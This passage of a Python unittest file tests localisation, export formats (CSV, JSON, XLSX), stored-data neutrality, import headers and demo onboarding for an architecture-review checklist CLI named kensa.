        self.assertEqual(code, 0)
        self.assertIn("ignoring unsupported KENSA_LANG", err)
        self.assertEqual(list(csv.reader(io.StringIO(read_text(c, "utf-8-sig"))))[0], i18n.LABELS["en"]["cols"])
        ctx = read_json(os.path.join(self.d, "context.json"))
        ctx["language"] = "de"
        write_json(ctx, os.path.join(self.d, "context.json"))
        self.assertEqual(self.export_header(), i18n.LABELS["en"]["cols"])
        self.assertEqual(run(["context", "set", "language=ja"], self.d)[0], 0)     # a bad value never blocks the command that fixes it

    def test_context_set_language_is_validated_and_stored_as_a_code(self):
        p = os.path.join(self.d, "context.json")
        for bad in ("xx", "fr", "", "japanese", "null", "1"):
            before = read_text(p)
            code, _, err = run(["context", "set", "service.name=changed", f"language={bad}"], self.d)
            self.assertNotEqual(code, 0, bad)
            self.assertIn("en, ja", err)                                   # the error lists the supported values
            self.assertEqual(read_text(p), before, bad)                    # nothing was saved, not even the valid pair
        for given, stored in (("ja", "ja"), ("EN", "en"), ("ja_JP", "ja"), ('"ja"', "ja")):
            self.assertEqual(run(["context", "set", f"language={given}"], self.d)[0], 0, given)
            self.assertEqual(read_json(p)["language"], stored, given)
        self.assertEqual(kensa.CONTEXT_TEMPLATE["language"], "en")

    def test_the_flag_is_validated_by_argparse_and_init_can_record_it(self):
        code, _, err = run(["status"], self.d, lang="xx")
        self.assertEqual(code, 2)
        self.assertIn("en, ja", err)
        d2 = os.path.join(self.tmp.name, "d2", ".kensa")
        run(["init"], d2, lang="ja")
        self.assertEqual(read_json(os.path.join(d2, "context.json"))["language"], "ja")

    def test_fill_defaults_and_legacy_context_defaults_follow_the_locale(self):
        self.assertEqual(kensa.fill("{po}/{infra_owner}/{chat}/{ticket}/{docs}/{service}", {}, "ja"),
                         "PO/インフラ担当/チャット/チケット管理/ドキュメント/本サービス")
        self.assertEqual(kensa.fill("{po}/{infra_owner}/{chat}/{ticket}/{docs}/{service}", {}, "en"),
                         "PO/Infra owner/chat/ticketing tool/documentation/this service")
        old_ctx = {"team": {"infra_owner": "インフラ担当"}, "tools": {"docs": "GitHub(docs/ と README)"}}      # a context.json written by an older version
        self.assertEqual(kensa.fill("{infra_owner} {docs}", old_ctx, "en"), "Infra owner GitHub (docs/ and README)")
        self.assertEqual(kensa.fill("{infra_owner} {docs}", old_ctx, "ja"), "インフラ担当 GitHub(docs/ と README)")
        self.assertEqual(kensa.fill("{infra_owner}", {"team": {"infra_owner": "Bob"}}, "ja"), "Bob")          # real values are never replaced
        tpl = kensa.CONTEXT_TEMPLATE
        self.assertFalse([s for s in walk_strings(tpl) if CJK.search(s)])

    def test_cli_messages_are_english_whatever_the_export_language(self):
        run(["finalize", "--allow-empty"], self.d)
        for lang in ("en", "ja"):
            for argv in (["plan"], ["status"], ["coverage"], ["mode"], ["push", "--workload-id", "w-1"], ["items", "--limit", "2"],
                         ["snapshot", "--label", f"x{lang}"], ["diff"], ["mode", "iac"], ["mode", "both"]):
                code, out, err = run(argv, self.d, lang=lang)
                self.assertFalse(CJK.search(out + err), (lang, argv, out + err))
        code, out, err = run(["--help"], self.d)
        self.assertFalse(CJK.search(out + err))
        for cmd in ("export", "seed", "cards", "diff", "push", "mode"):
            code, out, err = run([cmd, "--help"], self.d)
            self.assertFalse(CJK.search(out + err), cmd)


class ExportsPerLocale(Seeded):
    def prepare(self, finalize=True):
        self.apply(aws(ENC, "○"), aws(IDM, "○", channel="interview", confidence="M", evidence="we do this", due="2026-12-31", action_status="doing"))
        self.apply({"choice_id": "rel_planning_for_recovery_dr_tested", "verdict": "△", "channel": "repo", "confidence": "M", "evidence": "docs/dr.md present",
                    "recommendation": "write the DR plan", "owner": "alice"})
        if finalize:
            run(["finalize", "--allow-empty"], self.d)

    def test_json_export_holds_codes_only_and_names_its_language(self):
        self.prepare(finalize=False)
        for lang in ("en", "ja"):
            p = os.path.join(self.tmp.name, f"u-{lang}.json")
            run(["export", "--format", "json", "--out", p], self.d, lang=lang)
            counts = read_json(p)["counts"]
            self.assertIn("undetermined", counts)                       # a code, not a label
            self.assertNotIn("未判定", counts)
            self.assertNotIn("Undetermined", counts)
        run(["finalize", "--allow-empty"], self.d)
        for lang in ("en", "ja"):
            p = os.path.join(self.tmp.name, f"o-{lang}.json")
            self.assertEqual(run(["export", "--format", "json", "--out", p], self.d, lang=lang)[0], 0)
            doc = read_json(p)
            self.assertEqual(doc["language"], lang)
            by = {i["choice_id"]: i for i in doc["items"]}
            self.assertEqual(by[IDM]["action_status"], "doing")
            self.assertEqual((by[ENC]["verdict"], by[ENC]["channel"], by[ENC]["confidence"]), ("○", "aws", "H"))
            if lang == "en":
                self.assertEqual([s for s in walk_strings(doc) if CJK.search(s)], [])
            else:
                self.assertEqual(by["sec_protect_data_rest_key_mgmt"]["evidence"], OLD_JA_SYSTEM["ev.assumed"])     # shown in Japanese
                self.assertEqual(doc["context"]["team"]["infra_owner"], "インフラ担当")

    def test_csv_export_labels_per_locale_and_no_cjk_in_english(self):
        self.prepare()
        for lang in ("en", "ja"):
            t = i18n.labels(lang)
            p = os.path.join(self.tmp.name, f"o-{lang}.csv")
            run(["export", "--format", "csv", "--out", p], self.d, lang=lang)
            rows = list(csv.reader(io.StringIO(read_text(p, "utf-8-sig"))))
            self.assertEqual(rows[0], t["cols"])
            by = {r[3]: r for r in rows[1:]}
            self.assertEqual(by[ENC][7:10], ["○", t["ch"]["aws"], t["conf"]["H"]])
            self.assertEqual(by[IDM][8], t["ch"]["interview"])
            self.assertEqual(by["sec_protect_data_rest_key_mgmt"][7:10], ["✗", t["ch"]["assumed"], t["conf"]["L"]])
            self.assertEqual(by["sec_protect_data_rest_key_mgmt"][10], i18n.SYSTEM_TEXT["ev.assumed"][lang])
            self.assertEqual(by["sec_protect_data_rest_key_mgmt"][12], i18n.SYSTEM_TEXT["rec.assumed"][lang])
            self.assertTrue(by[ENC][17].startswith(t["tier"]["decide"] + t["tier_sep"] + t["route"]["aws"]), by[ENC][17])
            if lang == "en":
                self.assertEqual([c for r in rows for c in r if CJK.search(c)], [])

    @needs_openpyxl
    def test_xlsx_labels_per_locale_and_no_cjk_in_english(self):
        from openpyxl import load_workbook
        self.prepare()
        for lang in ("en", "ja"):
            t = i18n.labels(lang)
            x = os.path.join(self.tmp.name, f"o-{lang}.xlsx")
            self.assertEqual(run(["export", "--out", x], self.d, lang=lang)[0], 0)
            wb = load_workbook(x)
            self.assertEqual(wb.sheetnames, ["Summary", "Checklist", "Questions", "OpenItems", "ActionPlan", "Context"])
            self.assertEqual([c.value for c in wb["Checklist"][1]], t["cols"])
            self.assertEqual([c.value for c in wb["Questions"][1]], t["q_hdr"])
            self.assertEqual([c.value for c in wb["OpenItems"][1]], t["oi_hdr"])
            self.assertEqual([c.value for c in wb["ActionPlan"][1]], t["ap_hdr"])
            self.assertEqual([c.value for c in wb["Context"][1]], t["ctx_hdr"])
            self.assertEqual(wb["Summary"]["A1"].value, t["sum_title"])
            self.assertEqual([c.value for c in wb["Summary"][4]], t["sum_hdr"])
            reasons = {r[1].value: r[6].value for r in wb["OpenItems"].iter_rows(min_row=2)}
            self.assertEqual(reasons["sec_protect_data_rest_key_mgmt"], t["oi_assumed"])
            self.assertEqual(reasons[IDM], t["oi_self_reported"])
            if lang == "en":
                # the Questions sheet shows the card text, which is whatever language cards.json is in; everything else must be English
                bad = [(ws.title, c.coordinate) for ws in wb.worksheets for r in ws.iter_rows(min_row=1 if ws.title != "Questions" else 1,
                                                                                            max_row=1 if ws.title == "Questions" else None)
                       for c in r if isinstance(c.value, str) and CJK.search(c.value)]
                self.assertEqual(bad, [])

    @needs_openpyxl
    def test_summary_formulas_use_the_labels_of_the_active_locale(self):
        # the COUNTIFS criteria must match the label cells of the Checklist, in either locale (a mismatch would count 0)
        from openpyxl import load_workbook
        self.prepare(finalize=False)
        self.apply({"choice_id": "sec_protect_data_rest_key_mgmt", "verdict": "✗", "channel": "assumed", "confidence": "L"})     # undetermined and assumed items both exist
        w = self.work()
        for lang in ("en", "ja"):
            t = i18n.labels(lang)
            x = os.path.join(self.tmp.name, f"f-{lang}.xlsx")
            run(["export", "--out", x], self.d, lang=lang)
            wb = load_workbook(x)
            check = [[c.value for c in r] for r in wb["Checklist"].iter_rows(min_row=2)]
            n = 0
            for r in wb["Summary"].iter_rows(min_row=5):
                pillar = r[0].value
                if pillar not in kensa.PILLAR_ORDER:
                    continue
                items = [i for i in kensa.active(w) if i["pillar"] == pillar]
                for cell in r[1:6]:
                    m = re.fullmatch(r'=COUNTIFS\(Checklist!\$A:\$A,\$A\d+,Checklist!\$H:\$H,"(.*)"\)', cell.value)
                    self.assertTrue(m, cell.value)
                    got = sum(1 for row in check if row[0] == pillar and row[7] == m.group(1))
                    want = sum(1 for i in items if (i.get("verdict") or t["undetermined"]) == m.group(1))
                    self.assertEqual(got, want, (lang, pillar, m.group(1)))
                    n += 1
                m = re.fullmatch(r'=COUNTIFS\(Checklist!\$A:\$A,\$A\d+,Checklist!\$I:\$I,"(.*)"\)', r[7].value)
                self.assertEqual(m.group(1), t["ch"]["assumed"])
                self.assertEqual(sum(1 for row in check if row[0] == pillar and row[8] == m.group(1)),
                                 sum(1 for i in items if i.get("channel") == "assumed"))
            self.assertGreater(n, 5)
            tiers = {r[0].value: r[1].value for r in wb["Summary"].iter_rows(min_row=5) if r[0].value in t["tier"].values()}
            self.assertEqual(set(tiers), set(t["tier"].values()))
            for key, label in t["tier"].items():
                m = re.fullmatch(r'=COUNTIF\(Checklist!\$R:\$R,"(.*)\*"\)', tiers[label])
                self.assertEqual(m.group(1), label)
                self.assertEqual(sum(1 for row in check if str(row[17]).startswith(label)), sum(1 for i in kensa.active(w) if kensa.tier(i) == key))

    @needs_openpyxl
    def test_conditional_formats_follow_the_labels(self):
        from openpyxl import load_workbook
        self.prepare()
        for lang in ("en", "ja"):
            t = i18n.labels(lang)
            x = os.path.join(self.tmp.name, f"c-{lang}.xlsx")
            run(["export", "--out", x], self.d, lang=lang)
            ws = load_workbook(x)["Checklist"]
            crit = {str(rng.sqref): [f for rule in rules for f in rule.formula] for rng, rules in ws.conditional_formatting._cf_rules.items()}
            self.assertIn(f'"{t["undetermined"]}"', crit["H2:H13"])
            self.assertEqual(crit["I2:I13"], [f'"{t["ch"]["assumed"]}"'])


class StoredDataIsLanguageNeutral(Seeded):
    EN_CARD = {"title": "Roles", "why": "w", "ask": "who owns what?", "ladder": {"full": "documented", "partial": "partly", "none": "no"},
               "recommend": {"label": "Write a RACI", "why": "w", "steps": ["draw it", "agree it"], "effort": "S", "priority": "P2", "owner": "{po}"},
               "alternatives": [{"label": "On-call rotation", "when": "nights matter", "tradeoff": "load"}],
               "org_shape": "RACI in {docs}"}
    EN_NA_CARD = {"title": "Goals", "why": "w", "ask": "goals?", "ladder": {"full": "set", "partial": "some", "none": "none"}, "na_ok": True,
                  "recommend": {"label": "Set goals", "why": "w", "steps": ["do"], "effort": "S", "priority": "P3", "owner": "{po}"},
                  "alternatives": [{"label": "Skip", "when": "never", "tradeoff": "none"}], "org_shape": "goals in {docs}"}

    def setUp(self):
        super().setUp()
        # English text for the two cards used below, so that the stored values are not card text in another language
        write_json({"cards": {"C-OPS-OWNERSHIP": self.EN_CARD, "C-SUS-GOALS": self.EN_NA_CARD}}, os.path.join(self.d, "cards.local.json"))

    def stored_files(self):
        out = {}
        for rel in ("worklist.json", "context.json", "card_answers.json"):
            out[rel] = read_text(os.path.join(self.d, rel))
        hist = os.path.join(self.d, "history")
        for n in sorted(os.listdir(hist)) if os.path.isdir(hist) else []:
            out["history/" + n] = read_text(os.path.join(hist, n))
        return out

    def test_nothing_localized_is_stored_whatever_the_export_language(self):
        for lang in ("en", "ja"):
            d = os.path.join(self.tmp.name, f"w-{lang}", ".kensa")
            run(["init"], d)
            run(["seed", "--from-csv", FIXTURE], d)
            run(["context", "set", "tools.docs=the wiki"], d)          # a real value: placeholders then add no locale text to the card answers
            write_json({"cards": {"C-OPS-OWNERSHIP": self.EN_CARD, "C-SUS-GOALS": self.EN_NA_CARD}}, os.path.join(d, "cards.local.json"))
            run(["plan", "--skip", "repo,aws"], d)
            f = os.path.join(self.tmp.name, f"a-{lang}.json")
            write_json([aws(ENC, "○"), aws(IDM, "○", channel="interview", confidence="M", due="2026-12-31", action_status="doing")], f)
            self.assertEqual(run(["apply", f], d, lang=lang)[0], 0)
            run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "none", "--choose", "alt1"], d, lang=lang)
            run(["cards", "answer", "C-SUS-GOALS", "--current", "na"], d, lang=lang)
            run(["finalize", "--allow-empty"], d, lang=lang)
            run(["snapshot", "--label", "s"], d, lang=lang)
            for rel in ("worklist.json", "context.json", "card_answers.json"):
                text = read_text(os.path.join(d, rel))
                self.assertEqual(CJK.findall(text), [], (lang, rel))
            hist = os.path.join(d, "history")
            for n in os.listdir(hist):
                self.assertEqual(CJK.findall(read_text(os.path.join(hist, n))), [], (lang, n))
            w = read_json(os.path.join(d, "worklist.json"))
            by = {i["choice_id"]: i for i in w["items"]}
            self.assertEqual(by["sec_protect_data_rest_key_mgmt"]["evidence"], i18n.SYSTEM_TEXT["ev.assumed"]["en"])
            self.assertEqual(by["sec_protect_data_rest_key_mgmt"]["recommendation"], i18n.SYSTEM_TEXT["rec.assumed"]["en"])
            self.assertEqual(by[IDM]["action_status"], "doing")
            self.assertTrue(by[OWN]["org_shape"].startswith("(alternative adopted) "))
            self.assertTrue(by[OWN]["evidence"].startswith("Self-reported (none)"))
            self.assertEqual(by["sus_sus_hardware_a5"]["na_reason"], "Not applicable")
            snap = read_json(os.path.join(hist, os.listdir(hist)[0]))
            self.assertNotIn("未判定", snap["counts"])
            self.assertEqual(snap["label"], "s")

    def test_stored_texts_are_shown_in_the_export_language(self):
        run(["plan", "--skip", "repo,aws"], self.d)
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "partial", "--choose", "alt1", "--note", "some note"], self.d)
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "none", "--force"], self.d)       # self-reported evidence text
        run(["finalize", "--allow-empty"], self.d)
        for lang in ("en", "ja"):
            p = os.path.join(self.tmp.name, f"o-{lang}.csv")
            run(["export", "--format", "csv", "--out", p], self.d, lang=lang)
            by = {r[3]: r for r in csv.reader(io.StringIO(read_text(p, "utf-8-sig")))}
            self.assertEqual(by[OWN][10], i18n.prefix("ev.self", lang) + "none)")
            self.assertEqual(by[IDM][10], i18n.SYSTEM_TEXT["ev.assumed"][lang])
        # the proposal prefix of `cards prefill`
        d2 = os.path.join(self.tmp.name, "pf", ".kensa")
        run(["init"], d2)
        run(["seed", "--from-csv", FIXTURE], d2)
        write_json({"cards": {"C-OPS-OWNERSHIP": self.EN_CARD}}, os.path.join(d2, "cards.local.json"))
        run(["cards", "prefill"], d2)
        stored = {i["choice_id"]: i for i in read_json(os.path.join(d2, "worklist.json"))["items"]}[OWN]["org_shape"]
        self.assertTrue(stored.startswith("[Proposal] "))
        self.assertEqual(kensa.row_of(next(i for i in kensa.active(read_json(os.path.join(d2, "worklist.json"))) if i["choice_id"] == OWN), lang="ja")[11],
                         "【提案】RACI in GitHub (docs/ and README)")      # only the system-generated prefix is localized
        self.assertEqual(kensa.row_of(next(i for i in kensa.active(read_json(os.path.join(d2, "worklist.json"))) if i["choice_id"] == OWN), lang="en")[11],
                         "[Proposal] RACI in GitHub (docs/ and README)")

    def test_old_worklists_with_japanese_stored_values_still_work(self):
        w = self.work()
        for i in w["items"]:
            if i["choice_id"] == IDM:
                i.update(verdict="✗", channel="assumed", confidence="L", evidence=OLD_JA_SYSTEM["ev.assumed"], recommendation=OLD_JA_SYSTEM["rec.assumed"],
                         action_status="完了", effort="M")
            if i["choice_id"] == ENC:
                i.update(verdict="△", channel="aws", confidence="H", action_status="未着手", org_shape="【提案】x")
        self.save_work(w)
        for lang in ("en", "ja"):
            p = os.path.join(self.tmp.name, f"old-{lang}.csv")
            run(["export", "--format", "csv", "--out", p], self.d, lang=lang)
            by = {r[3]: r for r in csv.reader(io.StringIO(read_text(p, "utf-8-sig")))}
            self.assertEqual(by[IDM][10], i18n.SYSTEM_TEXT["ev.assumed"][lang])
            self.assertEqual(by[IDM][12], i18n.SYSTEM_TEXT["rec.assumed"][lang])
            self.assertEqual(by[ENC][11], i18n.SYSTEM_PREFIX["org.proposal"][lang] + "x")
            j = os.path.join(self.tmp.name, f"old-{lang}.json")
            run(["export", "--format", "json", "--out", j], self.d, lang=lang)
            items = {i["choice_id"]: i for i in read_json(j)["items"]}
            self.assertEqual((items[IDM]["action_status"], items[ENC]["action_status"]), ("done", "todo"))
        # a snapshot written by an older version counts undetermined items under the Japanese key
        run(["snapshot"], self.d)
        hist = os.path.join(self.d, "history")
        name = os.listdir(hist)[0]
        snap = read_json(os.path.join(hist, name))
        snap["counts"]["未判定"] = snap["counts"].pop("undetermined", 7)
        write_json(snap, os.path.join(hist, name))
        d = json.loads(run(["diff", "--json"], self.d)[1])
        self.assertIn("undetermined", d["counts"]["before"])
        self.assertNotIn("未判定", d["counts"]["before"])
        self.assertIn("undetermined=", run(["diff"], self.d)[1])


class ActionStatusAliases(Seeded):
    def test_codes_labels_and_japanese_aliases_are_accepted_and_stored_as_codes(self):
        norm = i18n.norm_action_status
        for given, code in (("todo", "todo"), ("doing", "doing"), ("done", "done"), ("未着手", "todo"), ("対応中", "doing"), ("完了", "done"),
                            ("Not started", "todo"), ("In progress", "doing"), ("Done", "done"), (" DONE ", "done"), ("in progress", "doing")):
            self.assertEqual(norm(given), code, given)
        for bad in ("finished", "", None, 3, "完了済み"):
            self.assertIsNone(norm(bad), bad)
        self.assertEqual(kensa.ACTION_STATUSES, ("todo", "doing", "done"))
        for given, code in (("未着手", "todo"), ("対応中", "doing"), ("完了", "done"), ("In progress", "doing"), ("done", "done")):
            code_, _, err = self.apply(aws(OWN, "△", channel="interview", confidence="M", action_status=given), force=True)
            self.assertEqual(code_, 0, (given, err))
            self.assertEqual(self.item(OWN)["action_status"], code, given)
        code, _, err = self.apply({"choice_id": OWN, "action_status": "finished"})
        self.assertNotEqual(code, 0)
        self.assertIn("todo / doing / done", err)
        self.assertEqual(self.item(OWN)["action_status"], "done")

    @needs_openpyxl
    def test_action_plan_shows_the_status_label_of_the_locale(self):
        from openpyxl import load_workbook
        self.apply(aws(OWN, "△", channel="interview", confidence="M", action_status="完了"))       # an old value is stored as a code
        self.assertEqual(self.item(OWN)["action_status"], "done")
        for lang in ("en", "ja"):
            x = os.path.join(self.tmp.name, f"s-{lang}.xlsx")
            run(["export", "--out", x], self.d, lang=lang)
            rows = {r[3].value: r[12].value for r in load_workbook(x)["ActionPlan"].iter_rows(min_row=2)}
            self.assertEqual(rows[OWN], i18n.labels(lang)["status"]["done"])


class CsvImportHeaders(Seeded):
    def make(self, headers, verdict, org):
        rows = list(csv.reader(io.StringIO(read_text(FIXTURE))))
        head = rows[0] + [headers[0], headers[1]]
        body = [r + ([verdict, org] if n == 0 else ["", ""]) for n, r in enumerate(rows[1:])]
        p = os.path.join(self.tmp.name, "import.csv")
        with open(p, "w", encoding="utf-8-sig", newline="") as f:
            csv.writer(f).writerows([head] + body)
        return p

    def test_both_header_sets_are_accepted_when_importing_verdicts(self):
        for headers in (("Verdict", "Org shape / tools"), ("判定", "組織の形、ツール")):
            d = os.path.join(self.tmp.name, "imp-" + headers[0], ".kensa")
            run(["init"], d)
            code, out, err = run(["seed", "--from-csv", self.make(headers, "△", "RACI in Slack"), "--import-verdicts"], d)
            self.assertEqual(code, 0, err)
            first = read_json(os.path.join(d, "worklist.json"))["items"][0]
            self.assertEqual((first["verdict"], first["channel"], first["confidence"], first["org_shape"]), ("△", "imported", "L", "RACI in Slack"), headers)
            self.assertEqual(first["evidence"], i18n.system_text("ev.imported"))
            self.assertEqual(CJK.findall(first["evidence"]), [])

    def test_exports_of_either_locale_can_be_imported_back(self):
        self.apply(aws(ENC, "○", org_shape="shape one"))
        run(["finalize", "--allow-empty"], self.d)
        for lang in ("en", "ja"):
            p = os.path.join(self.tmp.name, f"back-{lang}.csv")
            run(["export", "--format", "csv", "--out", p], self.d, lang=lang)
            d = os.path.join(self.tmp.name, "back-" + lang, ".kensa")
            run(["init"], d)
            self.assertEqual(run(["seed", "--from-csv", p, "--import-verdicts"], d)[0], 0)
            by = {i["choice_id"]: i for i in read_json(os.path.join(d, "worklist.json"))["items"]}
            self.assertEqual((by[ENC]["verdict"], by[ENC]["org_shape"], by[ENC]["channel"]), ("○", "shape one", "imported"), lang)
            self.assertEqual(by[IDM]["verdict"], "✗", lang)       # the assumed placeholders are imported as verdicts too, flagged "imported"
            # the imported evidence reads in the export language
            q = os.path.join(self.tmp.name, f"re-{lang}.csv")
            run(["export", "--format", "csv", "--out", q], d, lang=lang)
            row = {r[3]: r for r in csv.reader(io.StringIO(read_text(q, "utf-8-sig")))}[ENC]
            self.assertEqual(row[8], i18n.labels(lang)["ch"]["imported"])
            self.assertEqual(row[10], i18n.SYSTEM_TEXT["ev.imported"][lang])

    def test_import_header_helper(self):
        self.assertEqual(i18n.import_header({"Verdict": "○"}, i18n.VERDICT_COL), "○")
        self.assertEqual(i18n.import_header({"判定": "△"}, i18n.VERDICT_COL), "△")
        self.assertEqual(i18n.import_header({"Org shape / tools": "x"}, i18n.ORG_COL), "x")
        self.assertEqual(i18n.import_header({"組織の形、ツール": "y"}, i18n.ORG_COL), "y")
        self.assertEqual(i18n.import_header({}, i18n.VERDICT_COL), "")
        self.assertEqual(i18n.import_header({"Verdict": None, "判定": "✗"}, i18n.VERDICT_COL), "✗")


class CardsPerLocale(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = os.path.join(self.tmp.name, ".kensa")
        os.makedirs(self.d)

    def tearDown(self):
        self.tmp.cleanup()

    def test_the_loader_picks_the_cards_of_the_language(self):
        ja = read_json(os.path.join(ASSETS, "cards.ja.json"))
        base = read_json(os.path.join(ASSETS, "cards.json"))
        self.assertEqual(kensa.load_cards(kensa.Store(self.d, lang="ja")), ja)
        self.assertEqual(kensa.load_cards(kensa.Store(self.d, lang="en")), base)
        self.assertEqual(kensa.cards_path("ja"), os.path.join(ASSETS, "cards.ja.json"))
        self.assertEqual(kensa.cards_path("en"), os.path.join(ASSETS, "cards.json"))
        # both files describe the same cards: ids, order and placeholders (only the prose differs)
        for kind in ("cards", "business"):
            self.assertEqual([c["id"] for c in base[kind]], [c["id"] for c in ja[kind]], kind)
        ph = lambda o: sorted(re.findall(r"\{[a-z_]+\}", json.dumps(o, ensure_ascii=False)))
        self.assertEqual(ph(base), ph(ja))
        # the language comes from the context when nothing else is set
        write_json({"language": "ja"}, os.path.join(self.d, "context.json"))
        with mock.patch.dict(os.environ):
            os.environ.pop("KENSA_LANG", None)
            self.assertEqual(kensa.load_cards(kensa.Store(self.d)), ja)
            os.environ["KENSA_LANG"] = "en"
            self.assertEqual(kensa.load_cards(kensa.Store(self.d)), base)

    def test_a_language_without_a_cards_file_falls_back_to_the_default_cards(self):
        with tempfile.TemporaryDirectory() as assets:
            write_json({"cards": [{"id": "C-X"}], "business": []}, os.path.join(assets, "cards.json"))
            with mock.patch.object(kensa, "ASSETS", assets):
                self.assertEqual(kensa.load_cards(kensa.Store(self.d, lang="ja")), {"cards": [{"id": "C-X"}], "business": []})
                self.assertEqual(kensa.cards_path("ja"), os.path.join(assets, "cards.json"))

    def test_cards_local_overrides_work_in_every_language(self):
        for lang in ("en", "ja"):
            write_json({"cards": {"C-OPS-OWNERSHIP": {"title": "Local title"}, "C-NEW": {"title": "New card"}}}, os.path.join(self.d, "cards.local.json"))
            cards = kensa.load_cards(kensa.Store(self.d, lang=lang))
            by = {c["id"]: c for c in cards["cards"]}
            self.assertEqual(by["C-OPS-OWNERSHIP"]["title"], "Local title", lang)
            self.assertEqual(by["C-NEW"]["title"], "New card", lang)
            self.assertTrue(by["C-OPS-OWNERSHIP"]["recommend"], lang)                  # the other fields of the bundled card stay

    def test_cards_show_follows_the_language(self):
        d = os.path.join(self.tmp.name, "s", ".kensa")
        run(["init"], d)
        run(["seed", "--from-csv", FIXTURE], d)
        ja = read_json(os.path.join(ASSETS, "cards.ja.json"))
        title = next(c["title"] for c in ja["cards"] if c["id"] == "C-OPS-OWNERSHIP")
        out = run(["cards", "show", "C-OPS-OWNERSHIP"], d, lang="ja")[1]
        self.assertIn(title, out)
        self.assertTrue(CJK.search(out))
        self.assertTrue(out.startswith("### C-OPS-OWNERSHIP"))


class NoJapaneseInTheCliCode(unittest.TestCase):
    """CLI messages, help, docstrings and comments are English. Japanese may remain only where it is data: the aliases accepted
    on input, the `ja` label table (kensa_i18n.py) and keyword patterns that match Japanese repositories."""
    ALLOWED = {
        "kensa.py": {"実施", "実施(自然な状態)", "部分実施", "部分", "未実施", "該当なし", "未判定"},
        "kensa_wa.py": {r"none of these|これらのいずれにも|いずれにも該当しない"},
        "kensa_scan.py": {r"incident|outage|障害|sev[-_ ]?\d|\bp[0-3]\b", r"post-?mortem|\brca\b|retro|振り返り",
                          r"tech[-_ ]?debt|improvement|refactor|技術的負債|改善", r"priority|severity|sev[-_ ]?\d|優先"},
        "gen_routing_doc.py": set(),
    }

    def test_string_literals_with_japanese_are_only_aliases_and_keyword_patterns(self):
        import ast
        for name, allowed in self.ALLOWED.items():
            tree = ast.parse(read_text(os.path.join(SCRIPTS, name)))
            docstrings = {id(n.body[0].value) for n in ast.walk(tree)
                          if isinstance(n, (ast.Module, ast.FunctionDef, ast.ClassDef)) and n.body and isinstance(n.body[0], ast.Expr)
                          and isinstance(n.body[0].value, ast.Constant) and isinstance(n.body[0].value.value, str)}
            found = {n.value for n in ast.walk(tree) if isinstance(n, ast.Constant) and isinstance(n.value, str)
                     and CJK.search(n.value) and id(n) not in docstrings}
            self.assertLessEqual(found, allowed, (name, sorted(found - allowed)))

    def test_i18n_module_holds_japanese_only_in_ja_tables_and_aliases(self):
        import ast
        tree = ast.parse(read_text(os.path.join(SCRIPTS, "kensa_i18n.py")))
        ja_table = next(n for n in ast.walk(tree) if isinstance(n, ast.Dict) and any(isinstance(k, ast.Constant) and k.value == "ja" for k in n.keys))
        in_ja = {id(c) for k, v in zip(ja_table.keys, ja_table.values) if isinstance(k, ast.Constant) and k.value == "ja" for c in ast.walk(v)}
        for n in ast.walk(tree):
            if isinstance(n, ast.Constant) and isinstance(n.value, str) and CJK.search(n.value) and id(n) not in in_ja:
                # outside the table: only the status aliases and the system texts / prefixes (both locales sit side by side there)
                self.assertTrue(n.value in {"未着手", "対応中", "完了"} or n.value in OLD_JA_SYSTEM.values() or n.value in OLD_JA_PREFIX.values(),
                                (n.lineno, n.value))


class Onboarding(unittest.TestCase):
    """Usability: first-run guidance, the demo sandbox, doctor, and the messages that used to be ambiguous."""
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = os.path.join(self.tmp.name, ".kensa")

    def tearDown(self):
        self.tmp.cleanup()

    def seeded(self):
        run(["init"], self.d)
        run(["seed", "--from-csv", FIXTURE], self.d)

    def test_demo_asset_is_the_synthetic_fixture(self):
        self.assertEqual(read_text(os.path.join(ASSETS, "demo_checklist.csv")), read_text(FIXTURE))

    def test_demo_sandbox_works_offline_and_cannot_reach_the_w_a_tool(self):
        code, out, _ = run(["init", "--demo"], self.d)
        self.assertEqual(code, 0, out)
        w = read_json(os.path.join(self.d, "worklist.json"))
        self.assertTrue(w["meta"]["demo"])
        self.assertEqual(len(w["items"]), 12)
        code, out, _ = run(["cards", "next", "-n", "1"], self.d)
        self.assertIn("###", out)                         # cards are ready without any scan
        code, out, err = run(["push", "--workload-id", "0" * 32, "--apply"], self.d)
        self.assertEqual(code, 2)
        self.assertIn("demo", err)
        code, _, err = run(["seed", "--from-csv", FIXTURE], self.d)
        self.assertEqual(code, 2)
        self.assertIn("demo", err)
        code, out, _ = run(["finalize"], self.d)          # scans were skipped on purpose, so no --allow-empty is needed
        self.assertEqual(code, 0, out)
        code, out, _ = run(["push", "--workload-id", "0" * 32], self.d)   # the dry run still works
        self.assertEqual(code, 0, out)
        code, out, _ = run(["export", "--format", "csv", "--out", os.path.join(self.tmp.name, "d.csv")], self.d)
        self.assertEqual(code, 0, out)

    def test_demo_refuses_a_directory_that_already_holds_a_review(self):
        self.seeded()
        code, _, err = run(["init", "--demo"], self.d)
        self.assertEqual(code, 2)
        self.assertIn("--dir", err)
        self.assertEqual(len(read_json(os.path.join(self.d, "worklist.json"))["items"]), 12)

    def test_init_on_an_existing_review_points_to_plan(self):
        self.seeded()
        code, out, _ = run(["init"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("already exists", out)
        self.assertIn("`plan`", out)

    def test_cards_next_tells_waiting_for_scans_from_all_answered(self):
        self.seeded()
        code, out, _ = run(["cards", "next"], self.d)
        self.assertIn("waiting for evidence collection", out)
        self.assertIn("scan-aws", out)
        self.assertNotIn("All decision cards are answered", out)
        run(["plan", "--skip", "aws,repo"], self.d)
        code, out, _ = run(["cards", "next", "-n", "50"], self.d)
        cards = re.findall(r"^### (C-[A-Z0-9-]+)", out, re.M)
        self.assertTrue(cards)
        for c in cards:
            run(["cards", "answer", c, "--current", "partial", "--choose", "recommend"], self.d)
        code, out, _ = run(["cards", "next"], self.d)
        self.assertIn("All decision cards are answered", out)
        self.assertNotIn("waiting", out)

    def test_finalize_refuses_an_untouched_review_but_not_after_a_deliberate_skip(self):
        self.seeded()
        code, out, err = run(["finalize"], self.d)
        self.assertEqual(code, 2)
        self.assertIn("nothing has been scanned", err)
        self.assertIn("--allow-empty", err)
        self.assertNotIn("unresolved items set to", out)
        self.assertTrue(all(i.get("verdict") is None for i in read_json(os.path.join(self.d, "worklist.json"))["items"]))
